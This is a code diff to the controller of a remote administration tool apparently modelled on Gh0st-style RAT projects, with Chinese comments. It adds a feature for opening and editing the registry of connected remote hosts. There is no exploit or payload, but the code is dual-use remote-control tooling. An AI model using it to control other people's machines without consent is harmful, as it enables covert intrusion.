@@ -8,6 +8,7 @@
 #include "CcRemoteDlg.h"
 #include "afxdialogex.h"
 #include "CSettingDlg.h"
+#include "RegDlg.h"
 #include "..\..\common\macros.h"
 
 
@@ -87,7 +88,8 @@ BEGIN_MESSAGE_MAP(CCcRemoteDlg, CDialogEx)
 	ON_MESSAGE(WM_OPENMANAGERDIALOG, OnOpenManagerDialog)
 	ON_MESSAGE(WM_OPENAUDIODIALOG, OnOpenAudioDialog)
 	ON_MESSAGE(WM_OPENSERVERDIALOG, OnOpenServerDialog)
-
+	ON_MESSAGE(WM_OPENREGEDITDIALOG, OnOpenRegEditDialog)
+	
 	//-------------系统-------------
 	ON_WM_SYSCOMMAND()
 	ON_WM_PAINT()
@@ -553,6 +555,8 @@ void CCcRemoteDlg::OnOnlineProcess()
 void CCcRemoteDlg::OnOnlineRegist()
 {
 	// TODO: 在此添加命令处理程序代码
+	BYTE	bToken = COMMAND_REGEDIT;
+	SendSelectCommand(&bToken, sizeof(BYTE));
 }
 
 
@@ -813,6 +817,8 @@ void CCcRemoteDlg::ProcessReceiveComplete(ClientContext *pContext)
 		case SERVER_DLG:
 			((CServerDlg *)dlg)->OnReceiveComplete();
 			break;
+		case REGEDIT_DLG:
+			((CRegDlg *)dlg)->OnReceiveComplete();
 		default:
 			break;
 		}
@@ -878,6 +884,9 @@ void CCcRemoteDlg::ProcessReceiveComplete(ClientContext *pContext)
 		break;
 	case TOKEN_SERVERLIST:
 		g_pCcRemoteDlg->PostMessage(WM_OPENSERVERDIALOG, 0, (LPARAM)pContext);
+		break;
+	case TOKEN_REGEDIT:
+		g_pCcRemoteDlg->PostMessage(WM_OPENREGEDITDIALOG, 0, (LPARAM)pContext);
 		break;
 		// 命令停止当前操作
 	default:
@@ -1095,11 +1104,27 @@ LRESULT CCcRemoteDlg::OnOpenServerDialog(WPARAM wParam, LPARAM lParam)
 	ClientContext	*pContext = (ClientContext *)lParam;
 	CServerDlg	*dlg = new CServerDlg(this, m_iocpServer, pContext);  //动态创建CSystemDlg
 
-	// 设置父窗口为卓面
+	// 设置父窗口为桌面
 	dlg->Create(IDD_SERVERDLG, GetDesktopWindow());      //创建对话框
 	dlg->ShowWindow(SW_SHOW);                      //显示对话框
 
 	pContext->m_Dialog[0] = SERVER_DLG;              //这个值用做服务端再次发送数据时的标识
+	pContext->m_Dialog[1] = (int)dlg;
+	//先看一下这个对话框的界面再看这个对话框类的构造函数
+	return 0;
+}
+
+//注册表管理窗口
+LRESULT CCcRemoteDlg::OnOpenRegEditDialog(WPARAM wParam, LPARAM lParam)
+{
+	ClientContext	*pContext = (ClientContext *)lParam;
+	CRegDlg	*dlg = new CRegDlg(this, m_iocpServer, pContext);  //动态创建CSystemDlg
+
+	// 设置父窗口为桌面
+	dlg->Create(IDD_DIALOG_REGEDIT, GetDesktopWindow());      //创建对话框
+	dlg->ShowWindow(SW_SHOW);                      //显示对话框
+
+	pContext->m_Dialog[0] = REGEDIT_DLG;              //这个值用做服务端再次发送数据时的标识
 	pContext->m_Dialog[1] = (int)dlg;
 	//先看一下这个对话框的界面再看这个对话框类的构造函数
 	return 0;
